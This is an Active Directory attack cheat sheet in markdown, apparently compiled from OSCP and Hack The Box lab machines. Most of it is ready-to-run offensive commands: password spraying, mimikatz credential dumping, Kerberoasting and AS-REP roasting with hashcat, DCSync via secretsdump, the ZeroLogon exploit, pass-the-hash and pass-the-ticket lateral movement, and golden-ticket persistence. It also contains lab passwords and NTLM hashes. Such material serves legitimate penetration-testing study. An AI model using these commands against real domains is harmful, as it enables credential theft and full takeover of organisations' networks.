[TOC]



# Enumeration

### Ldap search

```bash
1# ldapsearch -h 10.10.10.182 -x -s base namingcontexts
2# ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local"
3# ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' #only poeple

1# enum4linux 10.10.10.182

```

### AD Dump

```bash
ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/
```

### Internal Basic

```powershell
PS C:\> net user
PS C:\> net user /domain
PS C:\> net user jeff_admin /domain
PS C:\> net group /domain
PS C:\> net localgroup "Audit Share"
PS C:\> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent::Domain()

PS C:\> get-scheduledtask
PS C:\> (get-scheduledtask -taskname "Revert Password and Expiry").actions | fl execute, arguments

Get Domain Controlers
#Get-ADDomainController
#Get-ADDomainController -Identity <DomainName>

Enumerate Domain Users
#Get-ADUser -Filter * -Identity <user> -Properties *
#Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description

Enum Domain Computers
#Get-ADComputer -Filter * -Properties *
#Get-ADGroup -Filter * 

Enum Local AppLocker Effective Policy
#Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### BloodHound

```bash
# run the collector on the machine using SharpHound.exe
# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
.\SharpHound.exe (from resources/Ingestor)
.\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
.\SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
.\SharpHound.exe -c all -d active.htb -SearchForest
.\SharpHound.exe --EncryptZip --ZipFilename export.zip
.\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>

# or run the collector on the machine using Powershell
# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>

# or remotely via BloodHound Python
# https://github.com/fox-it/BloodHound.py
pip install bloodhound
bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
```

# Authentication

**NTLM**

> NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos authentication.
>
> CHALLENGE BASED



**Kerberos**

> Basically, Kerberos is a network authentication protocol that works by using secret key cryptography. Clients authenticate with a Key Distribution Center and get temporary keys to access locations on the network. This allows for strong and secure authentication without transmitting passwords.
>
> TICKET BASED.



# Spray Attacks

```bash
$ crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2
$ crackmapexec smb fuse.fabricorp.local -u users.txt -p "Fabricorp01"
$ spray.sh -smb IP <users.txt> <passwords.txt> 0 0 <DOMAIN>
```



# Cashed Passwords

```bash
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
kerberos::list /export

OR
klist

sekurlsa::pth /user:ws01$ /domain:offense.local /ntlm:ab53503b0f35c9883ff89b75527d5861
```

# Service Account Attacks

**SPN**

A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name.



**Brute-force**

```bash
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```

```bash
$ net accounts # show lockout policy

```



# Kerbroasting

When you want to authenticate to some service using Kerberos, you contact the DC and tell it to which system service you want to authenticate. It encrypts a response to you with the service user’s password hash. You send that response to the service, which can decrypt it with it’s password, check who you are, and decide it if wants to let you in.

In a Kerberoasting attack, rather than sending the encrypted ticket from the DC to the service, you will use off-line brute force to crack the password associated with the service.

Most of the time you will need an active account on the domain in order to initial Kerberoast, but if the DC is configured with UserAccountControl setting “Do not require Kerberos preauthentication” enabled, it is possible to request and receive a ticket to crack without a valid account on the domain.

```powershell
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force

smbmap -H 10.10.10.100 -d active.htb -u administrator -p <Password>
psexec.py active.htb/administrator@10.10.10.100
```



# AS-REP Roasting

AS-REP roasting is a technique that allows retrieving password hashes for users that have `Do not require Kerberos preauthentication` property selected:

```powershell
C:\> kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/wordlist.txt --dc 10.10.10.175
C:\> GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
C:\> hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force
C:\> evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
```



# DCSync

```powershell
$ secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'

C:\> .\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit

$ wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175

$ psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175

$ evil-winrm -i 10.10.10.175 -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff
```



# ZeroLogon

**POC**

```bash
git clone https://github.com/dirkjanm/CVE-2020-1472.git
```

```shell
python /opt/CVE-2020-1472/cve-2020-1472-exploit.py MONTEVERDE 10.10.10.172
secretsdump.py -just-dc -no-pass MONTEVERDE\$@10.10.10.172
evil-winrm -u administrator -i 10.10.10.172 --hash '100a42db8caea588a626d3a9378cd7ea'
```



# Lateral Movement

**Pass The Hash**

```bash
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

**Overpass the Hash**

```powershell
$ privilege::debug
$ sekurlsa::pth /user:alice /domain:sv-dc01.svcorp.com /ntlm:7f004ce6b8f7b2a3b6c477806799b9c0 /run:PowerShell.exe

#Now convert NTLM hash to Kerbros TGT
$ net use \\dc01

#Open cmd.exe using psexec
$ .\PSExec.exe \\dc01 cmd.exe

```



**Pass the Ticket**

```powershell
whoami /user

$ kerberos::purge
$ kerberos::list
$ kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-278
7523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748
290D87AA966C327 /ptt

kerberos::list
```





# Persistence 



### Golden Ticket

**ON Domain Contorller** -- get the krbtgt NTLM hash -- Because DC traust any ticket correctly created by the krbtgt hash even if victim is not domain joined.

```powershell
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
RID : 000001f6 (502)
User : krbtgt
LM :
NTLM : 75b60230a2394a812000dbfad8415965
```

ON Victim -- Using mimikatz create Golden Ticket with krbtgt hash

```powershell
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2
787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt

mimikatz # misc::cmd

#get shell on DC using the injected Ticket
C:\Users\offsec.crop> psexec.exe \\dc01 cmd.exe
C:\Windows\system32> whoami
corp\fakeuser
```



# PowerView

```powershell
C:/> . .\PowerView.ps1
C:/> Get-NetDomain
C:/> 
```

